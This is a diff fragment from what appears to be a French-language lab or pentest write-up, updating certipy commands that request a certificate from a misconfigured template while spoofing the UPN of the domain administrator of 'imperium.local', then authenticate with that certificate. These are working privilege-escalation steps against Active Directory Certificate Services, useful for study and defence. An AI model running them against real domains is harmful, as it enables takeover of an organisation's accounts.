@@ -134,7 +134,7 @@ certipy req -u yueh.wellington@imperium.local -p 'PASSWORD' \
   -ca 'IMPERIUM-CA' \
   -template 'InterstellarTransport' \
   -upn 'administrator@imperium.local' \
-  -dc-ip 10.x.x.x
+  -dc-ip 10.2.62.171 -target-ip 10.2.62.169
 
 # Utilise le cert pour s'authentifier
 certipy auth -pfx administrator.pfx -dc-ip 10.x.x.x
